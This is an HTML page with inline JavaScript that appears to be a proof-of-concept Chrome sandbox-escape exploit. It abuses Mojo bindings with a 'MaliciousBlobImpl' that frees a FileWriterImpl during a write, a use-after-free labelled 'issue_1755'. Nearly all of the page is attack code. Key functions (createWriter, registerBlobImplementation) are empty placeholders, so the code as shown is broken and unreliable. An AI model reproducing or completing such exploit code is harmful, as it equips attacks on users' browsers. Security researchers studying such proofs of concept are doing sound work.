<script src="/many_args.js"></script>
<script src="/enable_mojo.js"></script>
<script src="/crash.js"></script>
<script>
  (function() {
    const oob = new many_args(); 
    const checkMojo = () => {
      console.log('[enable_mojo] mojo already enabled');
      initiateCrash(oob);
    };

    const enableAndCrash = () => {
      enable_mojo(oob);
    };

    if (typeof Mojo !== "undefined") {
      checkMojo();
    } else {
      enableAndCrash();
    }
  })();

  async function createWriter() {
    // Placeholder for writer creation logic
  }

  async function registerBlobImplementation() {
    // Placeholder for blob registration logic
  }

  async function initiateCrash(oob) {
    console.log('[sandbox_escape] exploiting issue_1755 to escape sandbox and crash browser');
    const writer = await createWriter();
    console.log('  [*] crafting renderer-hosted blob implementation');

    function MaliciousBlobImpl() {
      this.binding = new mojo.Binding(blink.mojom.Blob, this);
    }

    MaliciousBlobImpl.prototype = {
      getInternalUUID: async () => {
        console.log('  [*] getInternalUUID is called');
        console.log('  [!] freeing FileWriterImpl');
        writer.writer.ptr.reset();
        console.log('  [*] resuming FileWriterImpl::DoWrite, prepare to crash');
        return { 'uuid': 'blob_0' };
      }
    };

    registerBlobImplementation();
    const blobImpl = new MaliciousBlobImpl();
    const blobImplPtr = new blink.mojom.BlobPtr();
    blobImpl.binding.bind(mojo.makeRequest(blobImplPtr));
    console.log('  [*] calling Write with renderer-hosted blob implementation');
    writer.writer.write(0, blobImplPtr);
  }
</script>
